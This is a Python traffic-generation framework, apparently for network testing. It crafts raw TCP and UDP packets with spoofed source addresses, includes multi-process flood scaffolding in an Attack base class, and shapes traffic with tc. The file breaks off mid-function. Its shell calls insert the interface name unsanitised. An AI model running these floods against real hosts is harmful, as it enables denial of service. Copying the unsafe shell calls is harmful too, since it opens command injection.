#!/usr/bin/env python3
"""
Network Traffic Generator - A comprehensive framework for generating various network traffic patterns.

This module provides both attack and benign traffic simulation capabilities with configurable
parameters for network testing, performance evaluation, and security assessments.
"""

import json
import asyncio
import argparse
import array
import base64
import fcntl
import gzip
import logging
import multiprocessing
import os
import random
import signal
import socket
import struct
import sys
import time
import subprocess
from abc import ABC, abstractmethod
from datetime import datetime
from enum import Enum, auto
from multiprocessing import Event, Process, cpu_count
from typing import Any, Dict, List, Optional, Tuple, Type, Union

# Third-party imports
from faker import Faker
from scapy.all import IP, TCP, UDP, Raw, send
from Crypto.Cipher import AES

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)


class TrafficType(Enum):
    """Enumeration of traffic types supported by the framework."""
    ATTACK = auto()
    BENIGN = auto()


class ProtocolType(Enum):
    """Enumeration of network protocols supported by the framework."""
    TCP = auto()
    UDP = auto()
    MIXED = auto()


class NetworkUtils:
    """Utility class for common network operations."""
    
    @staticmethod
    def get_interface_mtu(ifname: str) -> int:
        """Get the MTU of the specified network interface.
        
        Args:
            ifname: The network interface name.
            
        Returns:
            The MTU value of the interface.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            mtu = struct.unpack(
                'H', fcntl.ioctl(sock.fileno(), 0x8921, struct.pack('256s', ifname[:15].encode()))[16:18]
            )[0]
            return mtu
        finally:
            sock.close()
    
    @staticmethod
    def check_interface(interface: str) -> Tuple[bool, Optional[int]]:
        """Check if the network interface exists and is up.
        
        Args:
            interface: The network interface name.
            
        Returns:
            A tuple of (is_valid, mtu) where is_valid is a boolean indicating if the interface
            is valid and up, and mtu is the interface's MTU if valid, None otherwise.
        """
        try:
            # Check if interface exists
            interfaces = os.listdir('/sys/class/net/')
            if interface not in interfaces:
                logger.error(f"Interface {interface} does not exist.")
                return False, None
            
            # Check interface state
            with open(f'/sys/class/net/{interface}/operstate', 'r') as f:
                state = f.read().strip()
                if state not in ['up', 'unknown']:
                    logger.error(f"Interface {interface} is not up (state: {state}).")
                    return False, None
            
            # Get interface MTU
            mtu = NetworkUtils.get_interface_mtu(interface)
            logger.info(f"Interface {interface} is up with MTU {mtu}.")
            return True, mtu
        except Exception as e:
            logger.error(f"Failed to validate interface {interface}: {e}")
            return False, None

    @staticmethod
    def get_local_ips(interface: str) -> List[str]:
        """Retrieve all local IPs assigned to the specified interface.
        
        Args:
            interface: The network interface name.
            
        Returns:
            List of local IP addresses assigned to the interface.
        """
        local_ips = []
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                interface_encoded = interface.encode('utf-8')
                max_possible = 128  # Arbitrary max number of IPs
                bytes_size = max_possible * 32
                names = array.array('B', b'\0' * bytes_size)
                outbytes = struct.unpack('iL', fcntl.ioctl(
                    s.fileno(),
                    0x8912,  # SIOCGIFCONF
                    struct.pack('iL', bytes_size, names.buffer_info()[0])
                ))[0]
                namestr = names.tobytes()
                for i in range(0, outbytes, 40):
                    name = namestr[i:i+16].split(b'\0', 1)[0].decode('utf-8')
                    if name == interface:
                        ip = socket.inet_ntoa(namestr[i+20:i+24])
                        if ip not in local_ips:
                            local_ips.append(ip)
        except Exception as e:
            logger.error(f"Error retrieving local IPs: {e}")
        return local_ips


class PayloadGenerator:
    """Utility class for generating packet payloads."""
    
    def __init__(self, fake: Faker):
        """Initialize the payload generator.
        
        Args:
            fake: Faker instance for generating random data.
        """
        self.fake = fake
    
    def generate_payload(self, identifier: str, max_size: int) -> str:
        """Generate a payload with a unique identifier.
        
        Args:
            identifier: String identifier to prefix the payload.
            max_size: Maximum size of the payload.
            
        Returns:
            The generated payload string.
        """
        # Create a shorter raw payload base to accommodate the identifier
        identifier_length = len(identifier)
        available_length = max_size - identifier_length
        
        # Generate raw payload within available space
        raw_payload = ''.join(random.choices(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
            k=random.randint(min(200, available_length), available_length)
        ))
        payload = identifier + raw_payload

        assert payload.startswith(identifier), f"Payload does not start with identifier: {identifier}"
        assert len(payload) <= max_size, f"Payload exceeds maximum size: {len(payload)} > {max_size}"
        
        logger.debug(f"Generated payload with identifier '{identifier}', size: {len(payload)}/{max_size}")
        return payload
    
    def encrypt_payload(self, payload: str) -> str:
        """Encrypt a payload using AES-256 encryption.
        
        Args:
            payload: The payload to encrypt.
            
        Returns:
            The Base64-encoded encrypted payload.
        """
        key = os.urandom(32)  # AES-256 key
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        
        # Ensure payload length is a multiple of 16 bytes for AES
        padding_length = 16 - (len(payload.encode()) % 16)
        padded_payload = payload.encode() + b' ' * padding_length
        
        encrypted_payload = iv + cipher.encrypt(padded_payload)
        return base64.b64encode(encrypted_payload).decode('utf-8')
    
    def compress_payload(self, payload: str) -> bytes:
        """Compress a payload using gzip.
        
        Args:
            payload: The payload to compress.
            
        Returns:
            The compressed payload as bytes.
        """
        return gzip.compress(payload.encode('utf-8'))


class PacketFactory:
    """Factory class for creating network packets."""
    
    def __init__(self, mtu: int):
        """Initialize the packet factory.
        
        Args:
            mtu: Maximum Transmission Unit for the interface.
        """
        self.mtu = mtu
        # Protocol header sizes
        self.ip_header_size = 20
        self.tcp_header_size = 20
        self.udp_header_size = 8
        
        # Pre-compute maximum payload sizes
        self.max_tcp_payload_size = self.mtu - self.ip_header_size - self.tcp_header_size
        self.max_udp_payload_size = self.mtu - self.ip_header_size - self.udp_header_size
        
        logger.info(f"Pre-computed max TCP payload size: {self.max_tcp_payload_size}, "
                    f"UDP payload size: {self.max_udp_payload_size}")
    
    def create_tcp_packet(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int, 
                          payload: str, window_size: int = 8192, flags: str = 'S', 
                          seq: int = 0, ack_seq: int = 0) -> bytes:
        """Create a TCP packet.
        
        Args:
            src_ip: Source IP address.
            dst_ip: Destination IP address.
            src_port: Source port.
            dst_port: Destination port.
            payload: Packet payload.
            window_size: TCP window size.
            flags: TCP flags (e.g., 'S' for SYN).
            seq: Sequence number.
            ack_seq: Acknowledgement sequence number.
            
        Returns:
            The raw TCP packet as bytes.
        """
        # Limit the payload size using pre-computed value
        limited_payload = payload[:self.max_tcp_payload_size]

        # Convert the TCP flags string to an integer representation
        tcp_flags_map = {
            'S': 0x02,    # SYN
            'A': 0x10,    # ACK
            'FA': 0x11,   # FIN + ACK
            'P': 0x08,    # PSH
            'R': 0x04     # RST
        }

        # Set to SYN by default if the flag is unknown
        flags_value = tcp_flags_map.get(flags, 0x02)

        # Calculate total length for IP header
        total_length = self.ip_header_size + self.tcp_header_size + len(limited_payload)

        # Construct the IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                69, 0, total_length, random.randint(0, 65535), 0, 255, socket.IPPROTO_TCP, 0,
                                socket.inet_aton(src_ip),
                                socket.inet_aton(dst_ip))

        # Construct the TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port, dst_port, seq, ack_seq, 80, flags_value, window_size, 0, 0)

        # Return the final packet, combining IP header, TCP header, and limited payload
        return ip_header + tcp_header + limited_payload.encode()
    
    def create_udp_packet(self, src_ip: str, dst_ip: str, sport: int, dport: int, payload: str) -> bytes:
        """Create a UDP packet.
        
        Args:
            src_ip: Source IP address.
            dst_ip: Destination IP address.
            sport: Source port.
            dport: Destination port.
            payload: Packet payload.
            
        Returns:
            The raw UDP packet as bytes.
        """
        # Limit the payload size using pre-computed value
        limited_payload = payload[:self.max_udp_payload_size]
        
        # Calculate total length for IP header
        total_length = self.ip_header_size + self.udp_header_size + len(limited_payload)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                69, 0, total_length, random.randint(0, 65535), 0, 255, socket.IPPROTO_UDP, 0,
                                socket.inet_aton(src_ip),
                                socket.inet_aton(dst_ip))
                                
        udp_header = struct.pack('!HHHH', sport, dport, self.udp_header_size + len(limited_payload), 0)
        return ip_header + udp_header + limited_payload.encode()


class TrafficShaper:
    """Class to manage traffic shaping on network interfaces."""
    
    def __init__(self, interface: str):
        """Initialize the traffic shaper.
        
        Args:
            interface: The network interface to shape traffic on.
        """
        self.interface = interface
        self.lockfile = '/tmp/traffic_shaping.lock'
        self.lock = None
    
    def acquire_lock(self) -> bool:
        """Acquire a file lock to prevent multiple shapers from running.
        
        Returns:
            True if lock acquired, False otherwise.
        """
        self.lock = open(self.lockfile, 'w')
        try:
            fcntl.flock(self.lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
            logger.info(f"Lock acquired: {self.lockfile}")
            return True
        except IOError:
            logger.warning("Another instance is managing traffic shaping. Exiting.")
            return False
    
    def release_lock(self) -> None:
        """Release the file lock."""
        try:
            if self.lock:
                fcntl.flock(self.lock, fcntl.LOCK_UN)
                self.lock.close()
                logger.info("Lock released.")
        except IOError as e:
            logger.error(f"Error releasing lock: {e}")
    
    def setup_shaping(self, packet_loss: int, jitter: Optional[int] = None) -> bool:
        """Set up traffic shaping on the interface.
        
        Args:
            packet_loss: Percentage of packet loss to simulate.
            jitter: Optional jitter in milliseconds to add.
            
        Returns:
            True if successful, False otherwise.
        """
        try:
            result = os.popen(f"tc qdisc show dev {self.interface}").read()
            if 'netem' in result or 'loss' in result:
                logger.info(f"Existing qdisc found. Deleting qdisc on {self.interface}.")
                os.system(f"tc qdisc del dev {self.interface} root")
            
            cmd = f"tc qdisc add dev {self.interface} root netem loss {packet_loss}%"
            if jitter:
                cmd += f" delay {jitter}ms"
            
            if os.system(cmd) != 0:
                logger.error("Failed to apply traffic shaping.")
                return False
            
            logger.info(f"Traffic shaping applied on {self.interface} with {packet_loss}% "
                        f"packet loss" + (f" and {jitter}ms jitter." if jitter else "."))
            return True
        except Exception as e:
            logger.error(f"Error during traffic shaping setup: {e}")
            return False
    
    def remove_shaping(self) -> bool:
        """Remove traffic shaping from the interface.
        
        Returns:
            True if successful, False otherwise.
        """
        try:
            os.system(f"tc qdisc del dev {self.interface} root")
            logger.info(f"Traffic shaping removed on {self.interface}.")
            return True
        except Exception as e:
            logger.error(f"Error during traffic shaping removal: {e}")
            return False


class PortStrategy:
    """Class to manage port selection strategies."""
    
    @staticmethod
    def choose_port(min_port: Optional[int] = None, max_port: Optional[int] = None) -> int:
        """Choose a destination port based on a selected strategy.
        
        Args:
            min_port: Optional minimum port number constraint.
            max_port: Optional maximum port number constraint.
            
        Returns:
            A port number.
        """
        strategy = random.choice(['random_port', 'port_range', 'common_port'])
        
        if strategy == 'random_port':
            if min_port and max_port:
                return random.randint(min_port, max_port)
            else:
                return random.randint(1, 65535)
        
        elif strategy == 'port_range':
            if min_port and max_port:
                # Ensure start_port is such that end_port does not exceed max_port
                start_port = random.randint(min_port, max(max_port - 1000, min_port))
                end_port = min(start_port + 1000, max_port)
                return random.randint(start_port, end_port)
            else:
                start_port = random.randint(1, 64535)
                end_port = min(start_port + 1000, 65535)
                return random.randint(start_port, end_port)
        
        elif strategy == 'common_port':
            common_ports = [80, 443, 8080, 53, 22, 25]
            if min_port and max_port:
                # Filter common ports within the specified range
                filtered_common_ports = [port for port in common_ports if min_port <= port <= max_port]
                if filtered_common_ports:
                    return random.choice(filtered_common_ports)
                else:
                    # Fallback to random port within min and max if no common ports are available
                    return random.randint(min_port, max_port)
            else:
                return random.choice(common_ports)


class Attack(ABC):
    """Base class for all attack types.
    
    This abstract class provides the common functionality for all attack types
    and defines the interface that all attack subclasses must implement.
    """
    
    traffic_type: TrafficType = TrafficType.ATTACK
    protocol_type: ProtocolType = ProtocolType.TCP

    # NEW: added custom_identifier to allow override via --identifier
    def __init__(
        self, 
        target_ips: List[str], 
        interface: str, 
        duration: int, 
        pause_event: Optional[Event] = None, 
        min_port: Optional[int] = None, 
        max_port: Optional[int] = None,
        custom_identifier: Optional[str] = None  # <--- New parameter
    ):
        """Initialize the attack.
        
        Args:
            target_ips: List of target IP addresses.
            interface: Network interface to use.
            duration: Duration of the attack in seconds.
            pause_event: Optional event to pause the attack.
            min_port: Optional minimum port number constraint.
            max_port: Optional maximum port number constraint.
            custom_identifier: Optional user-supplied identifier prefix to override defaults.
        """
        # Validate and convert inputs
        self.target_ips = target_ips if isinstance(target_ips, list) else [target_ips]
        self.target_ip = self.target_ips[0]  # For backward compatibility
        self.interface = interface
        self.duration = duration
        self.min_port = min_port
        self.max_port = max_port
        
        # Initialize state variables
        self.paused = False
        self.pause_event = pause_event if pause_event else Event()
        self.start_time: Optional[float] = None
        self.end_time: Optional[float] = None

        # Store user override identifier (None if not provided)
        self.custom_identifier = custom_identifier
        
        # Initialize helper instances
        self.fake = Faker()
        self.config = self.source_config()
        self.packet_loss = random.randint(1, 20)
        self.jitter = None
        
        # Check the interface
        is_valid, mtu = NetworkUtils.check_interface(self.interface)
        if not is_valid:
            logger.error(f"Interface {self.interface} is not valid or not up.")
            sys.exit(1)
        
        self.interface_mtu = mtu
        
        # Initialize factories and utilities
        self.packet_factory = PacketFactory(mtu or 1500)
        self.payload_generator = PayloadGenerator(self.fake)
        self.traffic_shaper = TrafficShaper(self.interface)
        
        # Register signal handlers
        signal.signal(signal.SIGUSR1, self.handle_pause_signal)
        signal.signal(signal.SIGUSR2, self.handle_resume_signal)
        
        logger.info(f"Initialized {self.__class__.__name__} targeting {self.target_ips} "
                    f"on {self.interface} for {self.duration}s")
    
    def source_config(self, config_file: str = '/root/traffic_gen/attacker.conf') -> Dict[str, str]:
        """Read configuration from a file.
        
        Args:
            config_file: Path to the configuration file.
            
        Returns:
            Dictionary of configuration key-value pairs.
        """
        config = {}
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "=" in line:
                        key, value = line.split("=", 1)
                        config[key.strip()] = value.strip().strip('"')
        return config
    
    def generate_random_ip(self) -> str:
        """Generate a random IP address.
        
        Returns:
            A random IP address string.
        """
        return f"10.{self.fake.random_int(0, 255)}.{self.fake.random_int(0, 255)}.{self.fake.random_int(2, 254)}"
    
    def generate_random_mac(self) -> str:
        """Generate a random MAC address.
        
        Returns:
            A random MAC address string.
        """
        return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
    
    def generate_payload(self, identifier: str, max_payload_size: Optional[int] = None) -> str:
        """Generate a payload with a unique identifier.
        
        If custom_identifier is set, it overrides 'identifier'.
        
        Args:
            identifier: String identifier to prefix the payload.
            max_payload_size: Optional maximum size of the payload.
            
        Returns:
            The generated payload string.
        """
        if max_payload_size is None:
            max_payload_size = self.packet_factory.max_tcp_payload_size
        
        # If the user provided a custom identifier, override the default
        effective_identifier = self.custom_identifier if self.custom_identifier else identifier
        return self.payload_generator.generate_payload(effective_identifier, max_payload_size)
    
    def handle_pause_signal(self, signum: int, frame: Any) -> None:
        """Handle SIGUSR1 signal to pause the attack.
        
        Args:
            signum: Signal number.
            frame: Current stack frame.
        """
        self.paused = True
        self.pause_event.set()  # Signal to child processes to pause
        logger.info("Attack paused.")
    
    def handle_resume_signal(self, signum: int, frame: Any) -> None:
        """Handle SIGUSR2 signal to resume the attack.
        
        Args:
            signum: Signal number.
            frame: Current stack frame.
        """
        self.paused = False
        self.pause_event.clear()  # Signal to child processes to resume
        logger.info("Attack resumed.")
    
    def choose_port_strategy(self) -> int:
        """Choose a destination port based on the selected strategy.
        
        Returns:
            A port number.
        """
        return PortStrategy.choose_port(self.min_port, self.max_port)
    
    @abstractmethod
    def run(self) -> None:
        """Run the attack.
        
        This method must be implemented by all subclasses.
        """
        pass
    
    def execute(self) -> None:
        """Main entry point for executing the attack."""
        def timeout_handler(signum: int, frame: Any) -> None:
            """Handle SIGALRM to terminate the attack after the specified duration.
            
            Args:
                signum: Signal number.
                frame: Current stack frame.
            """
            logger.info(f"Duration exceeded ({self.duration}s). Terminating attack.")
            # self.terminate_all_processes()
            self.pause_event.set()  # Signal the attack to stop
        
        def terminate_all_processes() -> None:
            """Terminate all processes associated with this attack."""
            logger.info("Attempting to terminate processes.")
            current_pid = os.getpid()
            try:
                # Send SIGTERM to the current process group, excluding the current process
                pgid = os.getpgid(current_pid)
                for pid in os.listdir('/proc'):
                    if pid.isdigit():
                        pid = int(pid)
                        try:
                            if os.getpgid(pid) == pgid and pid != current_pid:
                                os.kill(pid, signal.SIGTERM)
                                logger.info(f"Sent SIGTERM to process {pid}")
                        except OSError:
                            # Process may have already terminated
                            pass
            except Exception as e:
                logger.error(f"Failed to terminate processes: {e}")
            finally:
                logger.info("Process termination attempt completed.")

        
        # Set up signal for enforcing the duration
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(self.duration)
        
        # If not running in parallel benign mode, acquire the shaping lock.
        if not (getattr(self, "parallel", False) and self.traffic_type == TrafficType.BENIGN):
            if not self.traffic_shaper.acquire_lock():
                return
        
        try:
            # Set the process group ID to allow group termination
            os.setpgid(0, 0)
            # Only setup traffic shaping if not running as parallel benign.
            if not (getattr(self, "parallel", False) and self.traffic_type == TrafficType.BENIGN):
                self.traffic_shaper.setup_shaping(self.packet_loss, self.jitter)
            self.start_time = time.time()
            
            logger.info(f"Executing attack: {self.__class__.__name__} targeting {self.target_ips}")
            try:
                self.run()  # Run the subclass-specific logic
            except SystemExit:
                logger.info(f"Attack {self.__class__.__name__} stopped after {self.duration}s.")
        finally:
            signal.alarm(0)  # Disable alarm
            if not (getattr(self, "parallel", False) and self.traffic_type == TrafficType.BENIGN):
                self.traffic_shaper.remove_shaping()
                self.traffic_shaper.release_lock()
            terminate_all_processes()
            logger.info("Script completed.")


class TCPAttack(Attack):
    """Base class for TCP-based attacks."""
    
    protocol_type = ProtocolType.TCP
    
    async def async_send_packet(self, sock: socket.socket, packet: bytes) -> None:
        """Asynchronously send a packet.
        
        Args:
            sock: Socket to send the packet through.
            packet: The packet to send.
        """
        try:
            sock.sendto(packet, (self.target_ip, 0))
        except OSError as e:
            logger.error(f"Error sending packet: {e}")
    
    def start_flood(self) -> None:
        """Start a flood attack using multiple processes."""
        num_processes = cpu_count()
        processes = []
        
        for _ in range(num_processes):
            rate = random.randint(5000, 20000) // num_processes
            p = Process(target=self.run_flood_process, args=(rate, self.pause_event))
            p.start()
            processes.append(p)
        
        for p in processes:
            p.join()


class UDPAttack(Attack):
    """Base class for UDP-based attacks."""
    
    protocol_type = ProtocolType.UDP
    
    def run_process(self, pause_event: Event) -> None:
        """Run the UDP attack process.
        
        Args:
            pause_event: Event to pause the attack.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        try:
            self.send_packet_batch(sock, pause_event)
        finally:
            sock.close()


class BenignTraffic(Attack):
    """Base class for benign traffic simulation."""
    
    traffic_type = TrafficType.BENIGN
    
    def determine_traffic_load(self) -> int:
        """Adjust traffic load based on time of day, day of the week, and seasonality.
        
        Returns:
            Base rate of traffic.
        """
        now = datetime.now()
        hour = now.hour
        weekday = now.weekday()
        
        if 8 <= hour < 20:
            base_rate = random.randint(1500, 2500)
        else:
            base_rate = random.randint(200, 800)
        
        if weekday in [5, 6]:  # Saturday, Sunday
            base_rate = int(base_rate * 1.5)
        
        month = now.month
        if month in [11, 12]:  # November, December
            base_rate = int(base_rate * 1.2)
        
        return base_rate


##################
## TCP - BENIGN ##
##################


class TCPTraffic(BenignTraffic):
    """Class to simulate benign TCP traffic."""
    
    protocol_type = ProtocolType.TCP
    
    # Define target ports and raw packet ports
    target_ports = [80, 443, 22, 21, 3306, 53]  # Server's listening ports
    raw_packet_ports = [8080, 8443, 2121, 2022, 5432, 5353]  # Ports for raw packet simulation

    def __init__(self, target_ips: List[str], interface: str, duration: int, 
                 pause_event: Optional[Event] = None, min_port: Optional[int] = None, 
                 max_port: Optional[int] = None, custom_identifier: Optional[str] = None):
        super().__init__(target_ips, interface, duration, pause_event, min_port, max_port, custom_identifier)
        
        # List of local IPs assigned to the client's network interface
        self.local_ips = NetworkUtils.get_local_ips(self.interface)
        if not self.local_ips:
            logger.error("No additional local IPs found. Ensure multiple IPs are assigned to the interface.")
            sys.exit(1)

    def run(self) -> None:
        """Run the TCP traffic simulation."""
        logger.info("Starting TCP Traffic Simulation")
        # Ensure start_time is set
        if self.start_time is None:
            self.start_time = time.time()
            
        total_duration = self.duration
        num_processes_per_ip = max(5, multiprocessing.cpu_count() // 2 // len(self.target_ips))
        processes = []

        # Create processes for each target IP
        for target_ip in self.target_ips:
            for _ in range(num_processes_per_ip):
                logger.debug(f"Starting process for target {target_ip}")
                p = multiprocessing.Process(
                    target=self.run_process, 
                    args=(total_duration, self.pause_event, target_ip)
                )
                p.start()
                processes.append(p)

        for p in processes:
            p.join()
        logger.info("All processes have completed.")

    def run_process(self, total_duration: int, pause_event: Event, target_ip: str) -> None:
        """Run the traffic simulation asynchronously with pause_event.
        
        Args:
            total_duration: Duration of the simulation in seconds.
            pause_event: Event to pause the simulation.
            target_ip: Target IP address for this process.
        """
        # Configure logging for the child process
        logging.basicConfig(
            level=logging.DEBUG,
            format="%(asctime)s [%(levelname)s] [Process %(process)d] %(message)s",
            handlers=[logging.StreamHandler(sys.stdout)]
        )
        logger.info(f"Process started for target {target_ip}")
        try:
            asyncio.run(self.simulate_realistic_conditions(target_ip, total_duration, pause_event, self.interface))
        except Exception as e:
            logger.error(f"Error in simulate_realistic_conditions: {e}")
        logger.info(f"Process completed for target {target_ip}")

    async def simulate_realistic_conditions(self, target_ip: str, total_duration: int, 
                                            pause_event: Event, interface: str) -> None:
        """Simulate both standard load phases and random bursts over an extended period."""
        regions = ['NA', 'EU', 'ASIA', 'SA', 'AF', 'OCEANIA']
        semaphore = asyncio.Semaphore(100)  # Limit to 100 concurrent connections
        tasks = []

        async def limited_simulation(task: asyncio.Task) -> None:
            async with semaphore:
                await task

        while time.time() - self.start_time < total_duration:
            region = random.choice(regions)
            if random.random() < 0.05:
                # Simulate burst traffic
                tasks.append(asyncio.create_task(self.burst_traffic(target_ip, region, pause_event)))
            else:
                # Simulate standard load phases
                remaining_time = self.start_time + total_duration - time.time()
                phase_duration = min(random.randint(1800, 3600), remaining_time)
                tasks.append(asyncio.create_task(
                    self.manage_load_phases(target_ip, phase_duration, pause_event)
                ))

            # Occasionally initiate TCP client simulations
            if random.random() < 0.1:
                target_port = self.choose_port_strategy()
                tasks.append(asyncio.create_task(
                    self.simulate_tcp_client(target_ip, target_port, pause_event, interface)
                ))

            # Limit the number of concurrent tasks to prevent overload
            if len(tasks) > 1000:
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending)

        # Wait for all remaining tasks to complete
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def manage_load_phases(self, target_ip: str, total_duration: int, 
                                 pause_event: Event) -> None:
        """Manage traffic in load phases to reflect realistic patterns over long periods."""
        regions = ['NA', 'EU', 'ASIA', 'SA', 'AF', 'OCEANIA']
        traffic_types = ['DNS', 'NTP', 'SSDP', 'RANDOM']

        start_time = time.time()
        while time.time() - start_time < total_duration:
            region = random.choice(regions)
            traffic_type = random.choice(traffic_types)
            rate = self.determine_traffic_load()
            phase_duration = min(random.randint(3600, 7200), total_duration - (time.time() - start_time))
            await self.simulate_phase_for_target(
                target_ip, rate, phase_duration, region, traffic_type, pause_event
            )

    async def burst_traffic(self, target_ip: str, region: str, pause_event: Event) -> None:
        """Randomly simulate bursty traffic, mimicking unexpected surges."""
        burst_duration = min(random.randint(300, 600), self.duration)
        burst_rate = random.randint(7000, 15000)
        await self.simulate_phase_for_target(
            target_ip, burst_rate, burst_duration, region, "BURST", pause_event
        )

    async def simulate_phase_for_target(self, target_ip: str, rate: int, duration: int, 
                                        region: str, traffic_type: str, pause_event: Event) -> None:
        """Simulate a traffic phase to a specific target IP with given parameters."""
        start_time = time.time()
        burst_mode = False

        while time.time() - start_time < duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue

            # Raw packet simulation
            src_ip = self.generate_random_ip()
            sport = random.randint(1024, 65535)
            dport = random.choice(self.raw_packet_ports)
            window_size = random.randint(8192, 65535)
            flags = random.choice(['S', 'SA', 'FA', 'P', 'R'])
            tcp_options = [
                ('MSS', 1405),
                ('NOP', None),
                ('WScale', random.randint(0, 14)),
                ('Timestamp', (random.randint(0, 100000), 0))
            ]

            if random.random() < 0.15:
                burst_mode = True
                rate = random.randint(5000, 15000)

            await self.simulate_real_world_load(
                sport, dport, window_size, flags, tcp_options, duration=3,
                pause_event=pause_event, target_ip=target_ip
            )

            if burst_mode:
                burst_mode = False
                rate = random.randint(500, 1000)
            await asyncio.sleep(max(0.0001, random.uniform(0.001 / rate, 0.05 / rate)))

    async def simulate_real_world_load(self, sport: int, dport: int, window_size: int, 
                                  flags: str, tcp_options: List[Tuple], duration: int, 
                                  pause_event: Event, target_ip: str) -> None:
        """Simulate real-world load by sending TCP packets with raw sockets."""
        start_time = time.time()
        packet_interval = 0.01  # Interval between packets to limit rate
        
        # Create a raw socket for sending packets
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            while time.time() - start_time < duration:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue

                src_ip = self.generate_random_ip()
                payload = self.generate_payload("BENIGN-TCP-", self.packet_factory.max_tcp_payload_size)
                
                # Use packet factory to create TCP packet with MTU limits
                packet = self.packet_factory.create_tcp_packet(
                    src_ip=src_ip, 
                    dst_ip=target_ip, 
                    src_port=sport, 
                    dst_port=dport, 
                    payload=payload,
                    window_size=window_size,
                    flags=flags
                )

                try:
                    # Send using raw socket
                    sock.sendto(packet, (target_ip, 0))
                    logger.debug(f"Raw packet sent to {target_ip}:{dport} from {src_ip}:{sport} with flags {flags}")
                except OSError as e:
                    logger.error(f"Error sending raw packet: {e}")

                await asyncio.sleep(packet_interval)

                if random.random() < 0.02:
                    idle_time = random.uniform(0.01, 0.2)
                    await asyncio.sleep(idle_time)

                if random.randint(0, 10000) < 1:
                    pause_time = random.uniform(0.5, 2)
                    logger.info(f"Pausing traffic for {pause_time:.2f} seconds for natural idle period...")
                    await asyncio.sleep(pause_time)
        finally:
            sock.close()

    async def simulate_tcp_client(self, target_ip: str, target_port: int, 
                                  pause_event: Event, interface: str) -> None:
        """Simulate a TCP client that performs persistent connections."""
        max_retries = 5
        retry_delay = 3

        while time.time() - self.start_time < self.duration:
            try:
                if pause_event.is_set():
                    logger.info(f"Pause event set. Skipping TCP client simulation to {target_ip}:{target_port}")
                    await asyncio.sleep(1)
                    continue

                local_ip = random.choice(self.local_ips)
                # src_ip = self.generate_random_ip()
                    
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(
                            host=target_ip, port=target_port, local_addr=(local_ip, 0)
                        ),
                        timeout=10
                    )
                    logger.info(f"TCP connection established to {target_ip}:{target_port} from {local_ip}")
                except ConnectionRefusedError:
                    logger.error(f"Connection refused by {target_ip}:{target_port} from {local_ip}")
                    await asyncio.sleep(retry_delay)
                    continue
                except asyncio.TimeoutError:
                    logger.error(f"Timeout while attempting to connect to {target_ip}:{target_port} from {local_ip}")
                    await asyncio.sleep(retry_delay)
                    continue
                except Exception as e:
                    logger.error(f"Unexpected error while connecting to {target_ip}:{target_port} from {local_ip}: {e}")
                    await asyncio.sleep(retry_delay)
                    continue

                connection_duration = random.uniform(30, 300)
                connection_start_time = time.time()

                while time.time() - connection_start_time < connection_duration:
                    if pause_event.is_set():
                        logger.info(f"Pause event set. Closing connection to {target_ip}:{target_port}")
                        break

                    payload = self.generate_payload("BENIGN-TCP-", self.packet_factory.max_tcp_payload_size)
                    writer.write(payload.encode())
                    logger.debug(f"Sent BENIGN payload to {target_ip}:{target_port} from {local_ip}")
                    await writer.drain()

                    logger.debug(f"Awaiting response from {target_ip}:{target_port} to {local_ip}")
                    try:
                        data = await asyncio.wait_for(reader.read(1500), timeout=10)
                        if data:
                            if b"ACK" in data:
                                logger.info(f"ACK received from {target_ip}:{target_port} for {local_ip}")
                            elif b"ERR" in data:
                                logger.warning(f"Error received from {target_ip}:{target_port} for {local_ip}")
                            else:
                                logger.warning(f"Unrecognized response from {target_ip}:{target_port} for {local_ip}: {data}")
                        else:
                            logger.warning(f"No response received from {target_ip}:{target_port} for {local_ip}")
                    except asyncio.TimeoutError:
                        logger.warning(f"No response received from {target_ip}:{target_port} for {local_ip} within timeout period.")

                    if random.random() < 0.1:
                        logger.info(f"Randomly deciding to close the connection to {target_ip}:{target_port} from {local_ip}")
                        break

                    inter_packet_delay = random.uniform(0.5, 5)
                    logger.info(f"Waiting for {inter_packet_delay:.2f} seconds before sending next payload to {target_ip}:{target_port} from {local_ip}")
                    await asyncio.sleep(inter_packet_delay)

                logger.info(f"Closing TCP connection with {target_ip}:{target_port} from {local_ip}")
                writer.close()
                await writer.wait_closed()
                logger.info(f"TCP connection closed with {target_ip}:{target_port} from {local_ip}")

            except Exception as e:
                logger.error(f"Error in TCP client to {target_ip}:{target_port}: {e}")
                await asyncio.sleep(retry_delay)

    def choose_port_strategy(self) -> int:
        """Choose a target port based on some strategy."""
        return random.choice(self.target_ports)


##################
## UDP - Benign ##
##################


class UDPTraffic(BenignTraffic):
    """Class to simulate benign UDP traffic."""
    
    protocol_type = ProtocolType.UDP
    
    def run(self) -> None:
        """Run the UDP traffic simulation."""
        logger.info("Starting UDP Benign Traffic Simulation")
        # Ensure start_time is set
        if self.start_time is None:
            self.start_time = time.time()
            
        total_duration = self.duration
        # Update: Use 50% of available CPU cores per target IP
